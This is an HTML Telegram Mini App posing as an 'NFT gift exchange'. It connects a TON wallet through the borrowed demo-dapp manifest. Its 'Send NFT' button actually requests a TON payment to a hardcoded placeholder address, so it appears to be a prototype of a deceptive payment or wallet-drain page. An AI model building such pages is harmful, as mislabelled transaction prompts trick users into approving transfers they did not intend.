<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Exchange Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@2.0.6/dist/tonconnect-ui.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #182533;
            color: white;
            text-align: center;
            padding: 20px;
        }
        #ton-connect-btn {
            margin: 30px auto;
            display: flex;
            justify-content: center;
            min-height: 44px;
        }
        .btn-send {
            background-color: #2481cc;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            display: none;
            margin-top: 20px;
            width: 80%;
            max-width: 300px;
        }
        #error-log {
            color: #ff6b6b;
            font-size: 12px;
            margin-top: 20px;
            word-break: break-all;
        }
    </style>
</head>
<body>

    <h2>🔄 Обмен NFT Подарков</h2>
    <p>Подключите кошелек для автоматического подтверждения сделки</p>

    <div id="ton-connect-btn"></div>

    <button id="send-nft-btn" class="btn-send">Отправить NFT на обмен</button>
    
    <div id="error-log"></div>

    <script>
        // Инициализация Telegram Web App
        try {
            if (window.Telegram && window.Telegram.WebApp) {
                window.Telegram.WebApp.ready();
                window.Telegram.WebApp.expand();
            }
        } catch (e) {
            console.error(e);
        }

        let tonConnectUI;

        // Безопасная инициализация TON Connect
        try {
            tonConnectUI = new TONConnectUI.TonConnectUI({
                manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp/main/public/tonconnect-manifest.json',
                buttonRootId: 'ton-connect-btn'
            });

            const sendBtn = document.getElementById('send-nft-btn');

            // Следим за статусом кошелька
            tonConnectUI.onStatusChange(wallet => {
                if (wallet) {
                    sendBtn.style.display = 'inline-block';
                } else {
                    sendBtn.style.display = 'none';
                }
            });

            sendBtn.addEventListener('click', async () => {
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 60,
                    messages: [
                        {
                            address: "EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c",
                            amount: "10000000" // 0.01 TON для теста списания комиссии за транзакцию
                        }
                    ]
                };

                try {
                    await tonConnectUI.sendTransaction(transaction);
                    alert("Успешно!");
                    if (window.Telegram && window.Telegram.WebApp) window.Telegram.WebApp.close();
                } catch (e) {
                    alert("Ошибка транзакции или отмена.");
                }
            });

        } catch (error) {
            // Если скрипт упал, мы увидим текст ошибки прямо на экране телефона
            document.getElementById('error-log').innerText = "Ошибка запуска TON Connect: " + error.message;
        }
    </script>
</body>
</html>
